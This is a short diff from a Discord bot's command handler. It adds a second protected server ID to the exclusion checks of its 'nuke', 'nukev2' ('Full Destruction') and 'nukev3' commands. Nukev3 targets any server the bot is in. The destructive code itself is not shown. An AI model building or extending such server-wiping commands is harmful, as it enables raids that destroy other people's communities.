@@ -990,7 +990,7 @@ async function handleModCommand(message, client) {
 
       case 'nuke': {
         if (!isOwner) return NO_PERM();
-        if (guild.id === '1412267331266281593') return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
+        if (['1412267331266281593','1500846516267651224'].includes(guild.id)) return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
         const nukeEmbed = new EmbedBuilder()
           .setColor(0xED4245)
           .setTitle('💣 Nuke Server')
@@ -1011,7 +1011,7 @@ async function handleModCommand(message, client) {
 
       case 'nukev2': {
         if (!isOwner) return NO_PERM();
-        if (guild.id === '1412267331266281593') return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
+        if (['1412267331266281593','1500846516267651224'].includes(guild.id)) return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
         const nv2Embed = new EmbedBuilder()
           .setColor(0xED4245)
           .setTitle('☢️ Nuke V2 — Full Destruction')
@@ -1036,7 +1036,7 @@ async function handleModCommand(message, client) {
         if (!nv3ServerId || !/^\d{17,20}$/.test(nv3ServerId)) {
           return message.reply('Usage: `>nukev3 <server_id>`');
         }
-        if (nv3ServerId === '1412267331266281593') return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
+        if (['1412267331266281593','1500846516267651224'].includes(nv3ServerId)) return message.reply({ embeds: [modEmbed(0xED4245, '🛡️ This server is protected and cannot be nuked.')] });
         let nv3Guild = client.guilds.cache.get(nv3ServerId) ?? await client.guilds.fetch(nv3ServerId).catch(() => null);
         if (!nv3Guild) {
           return message.reply({ embeds: [modEmbed(0xED4245, `❌ Bot is not in a server with ID \`${nv3ServerId}\`.`)] });
